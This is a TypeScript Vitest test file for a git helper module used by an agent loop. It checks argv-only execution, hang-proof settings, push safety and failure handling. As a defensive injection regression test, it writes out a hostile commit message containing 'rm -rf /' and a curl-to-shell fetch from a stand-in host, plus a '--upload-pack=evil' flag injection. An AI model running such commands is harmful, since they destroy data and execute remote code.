// Transactional git + hang immunity + injection regression (v2l101 —
// src/lib/loop/git-tx.ts). AC: "argv-array exec with an injection regression
// test; agent-derived strings can never reach a shell."

import { execFileSync } from "node:child_process";
import { mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, beforeEach, describe, expect, it } from "vitest";

import {
  CommitFailedError,
  PushFailedError,
  commitAll,
  diffStat,
  getCommitCount,
  getHead,
  hasUncommittedChanges,
  pushCurrentBranch,
  resetHard,
  statusSnapshot,
  type Exec,
  type ExecResult,
} from "../src/lib/loop/git-tx.js";

// ---------------------------------------------------------------------------
// Recording fake exec
// ---------------------------------------------------------------------------

interface Call {
  cmd: string;
  args: string[];
  env: Record<string, string> | undefined;
}

function fakeExec(
  respond: (cmd: string, args: string[]) => Partial<ExecResult> | undefined = () => undefined,
): { exec: Exec; calls: Call[] } {
  const calls: Call[] = [];
  const exec: Exec = (cmd, args, opts) => {
    calls.push({ cmd, args: [...args], env: opts?.env });
    const r = respond(cmd, [...args]);
    return { stdout: "", stderr: "", exitCode: 0, ...(r ?? {}) };
  };
  return { exec, calls };
}

describe("injection regression (agent-derived strings never reach a shell)", () => {
  it("a hostile commit message travels as ONE argv element, verbatim", () => {
    const evil = 'pwned"; rm -rf / #`$(curl evil.sh | sh)` \'$HOME\' && :';
    const { exec, calls } = fakeExec((_cmd, args) =>
      args[0] === "diff" ? { exitCode: 1 } : undefined,
    );
    commitAll(exec, "/repo", evil);
    const commit = calls.find((c) => c.args.includes("commit"));
    expect(commit).toBeDefined();
    expect(commit!.cmd).toBe("git");
    // The message is a single element, byte-identical — no quoting, no
    // interpolation, no splitting.
    expect(commit!.args[commit!.args.length - 1]).toBe(evil);
    expect(commit!.args.filter((a) => a === evil)).toHaveLength(1);
  });

  it("the module never builds a shell command (structural pin)", () => {
    const src = readFileSync(
      join(process.cwd(), "src", "lib", "loop", "git-tx.ts"),
      "utf8",
    );
    // No child_process exec/execSync (string-through-shell APIs) and no
    // shell: true. The seam is spawnSync-backed realExec (argv arrays).
    expect(src).not.toMatch(/from\s+["']node:child_process["']/);
    expect(src).not.toMatch(/\bexecSync\b/);
    expect(src).not.toMatch(/shell\s*:\s*true/);
  });

  it("refs that look like flags are refused before reaching git", () => {
    const { exec, calls } = fakeExec();
    expect(() => getCommitCount(exec, "/repo", "--upload-pack=evil")).toThrow(/looks like a flag/);
    expect(calls).toHaveLength(0);
  });

  it("empty commit messages are refused", () => {
    const { exec } = fakeExec();
    expect(() => commitAll(exec, "/repo", "   ")).toThrow(/non-empty/);
  });
});

describe("hang immunity (GIT_TERMINAL_PROMPT=0 + gpgsign off)", () => {
  it("EVERY git call carries GIT_TERMINAL_PROMPT=0", () => {
    const { exec, calls } = fakeExec((_cmd, args) =>
      args[0] === "diff" ? { exitCode: 1 } : { stdout: "abc" },
    );
    commitAll(exec, "/repo", "msg");
    resetHard(exec, "/repo");
    hasUncommittedChanges(exec, "/repo");
    getHead(exec, "/repo");
    pushCurrentBranch(exec, "/repo");
    expect(calls.length).toBeGreaterThan(5);
    for (const call of calls) {
      expect(call.env?.GIT_TERMINAL_PROMPT).toBe("0");
    }
  });

  it("commits disable commit+tag gpg signing via -c flags", () => {
    const { exec, calls } = fakeExec((_cmd, args) =>
      args[0] === "diff" ? { exitCode: 1 } : undefined,
    );
    commitAll(exec, "/repo", "msg");
    const commit = calls.find((c) => c.args.includes("commit"))!;
    const joined = commit.args.join(" ");
    expect(joined).toContain("-c commit.gpgsign=false");
    expect(joined).toContain("-c tag.gpgsign=false");
  });
});

describe("push safety", () => {
  it("never forces and never pulls", () => {
    const { exec, calls } = fakeExec();
    pushCurrentBranch(exec, "/repo");
    for (const call of calls) {
      expect(call.args).not.toContain("--force");
      expect(call.args).not.toContain("-f");
      expect(call.args).not.toContain("--force-with-lease");
      expect(call.args[0]).not.toBe("pull");
    }
  });

  it("first push sets upstream; later pushes reuse it", () => {
    const noUpstream = fakeExec((_cmd, args) =>
      args.includes("@{upstream}") ? { exitCode: 1, stderr: "no upstream" } : undefined,
    );
    pushCurrentBranch(noUpstream.exec, "/repo");
    const firstPush = noUpstream.calls.find((c) => c.args[0] === "push")!;
    expect(firstPush.args).toEqual(["push", "-u", "origin", "HEAD"]);

    const withUpstream = fakeExec();
    pushCurrentBranch(withUpstream.exec, "/repo");
    const rePush = withUpstream.calls.find((c) => c.args[0] === "push")!;
    expect(rePush.args).toEqual(["push"]);
  });

  it("push failure surfaces as PushFailedError with the git detail", () => {
    const { exec } = fakeExec((_cmd, args) =>
      args[0] === "push" ? { exitCode: 128, stderr: "remote: rejected" } : undefined,
    );
    expect(() => pushCurrentBranch(exec, "/repo")).toThrow(PushFailedError);
    try {
      pushCurrentBranch(exec, "/repo");
    } catch (e) {
      expect((e as PushFailedError).detail).toContain("remote: rejected");
    }
  });
});

describe("commit / reset failure shapes", () => {
  it("a clean tree returns committed:false (not an error)", () => {
    const { exec, calls } = fakeExec((_cmd, args) =>
      args[0] === "rev-parse" ? { stdout: "headsha" } : undefined, // diff --cached exits 0 → clean
    );
    const r = commitAll(exec, "/repo", "msg");
    expect(r.committed).toBe(false);
    expect(calls.some((c) => c.args.includes("commit"))).toBe(false);
  });

  it("commit failure throws CommitFailedError carrying stdout+stderr", () => {
    const { exec } = fakeExec((_cmd, args) => {
      if (args[0] === "diff") return { exitCode: 1 };
      if (args.includes("commit")) return { exitCode: 1, stderr: "hook says no" };
      return undefined;
    });
    expect(() => commitAll(exec, "/repo", "msg")).toThrow(CommitFailedError);
    try {
      commitAll(exec, "/repo", "msg");
    } catch (e) {
      expect((e as CommitFailedError).detail).toContain("hook says no");
    }
  });

  it("resetHard = reset --hard HEAD then clean -fd, in that order", () => {
    const { exec, calls } = fakeExec();
    resetHard(exec, "/repo");
    expect(calls.map((c) => c.args)).toEqual([
      ["reset", "--hard", "HEAD"],
      ["clean", "-fd"],
    ]);
  });

  it("statusSnapshot never throws — errors land in the snapshot", () => {
    const { exec } = fakeExec(() => ({ exitCode: 128, stderr: "not a repo" }));
    const snap = statusSnapshot(exec, "/repo");
    expect("error" in snap).toBe(true);
  });
});

// ---------------------------------------------------------------------------
// Real-git integration (one small end-to-end pass)
// ---------------------------------------------------------------------------

describe("real-git integration", () => {
  let repo: string;

  beforeEach(() => {
    repo = mkdtempSync(join(tmpdir(), "devx-git-tx-"));
    const g = (...args: string[]) =>
      execFileSync("git", args, { cwd: repo, encoding: "utf8" });
    g("init", "-q", "-b", "main");
    g("config", "user.email", "loop@test");
    g("config", "user.name", "loop");
    writeFileSync(join(repo, "a.txt"), "one\n");
    g("add", "-A");
    g("commit", "-q", "-m", "base");
  });
  afterEach(() => rmSync(repo, { recursive: true, force: true }));

  it("commitAll → snapshot → resetHard round-trips a real tree", async () => {
    const { realExec } = await import("../src/lib/loop/git-tx.js");
    const base = getHead(realExec, repo);

    writeFileSync(join(repo, "b.txt"), "two\n");
    expect(hasUncommittedChanges(realExec, repo)).toBe(true);
    const commit = commitAll(realExec, repo, "loop iteration 1: adds b\n\nwith a body");
    expect(commit.committed).toBe(true);
    expect(hasUncommittedChanges(realExec, repo)).toBe(false);
    expect(getCommitCount(realExec, repo, base)).toBe(1);
    const stat = diffStat(realExec, repo, base);
    expect(stat.filesChanged).toBe(1);
    expect(stat.linesAdded).toBe(1);

    // Uncommitted junk (tracked edit + untracked file) is fully discarded.
    writeFileSync(join(repo, "a.txt"), "mutated\n");
    writeFileSync(join(repo, "junk.tmp"), "junk\n");
    resetHard(realExec, repo);
    expect(hasUncommittedChanges(realExec, repo)).toBe(false);
    expect(readFileSync(join(repo, "a.txt"), "utf8")).toBe("one\n");
    // Committed work survives the reset.
    expect(getCommitCount(realExec, repo, base)).toBe(1);

    const snap = statusSnapshot(realExec, repo, base);
    expect(snap).toMatchObject({ branch: "main", commitCount: 1, dirty: false });
  });
});
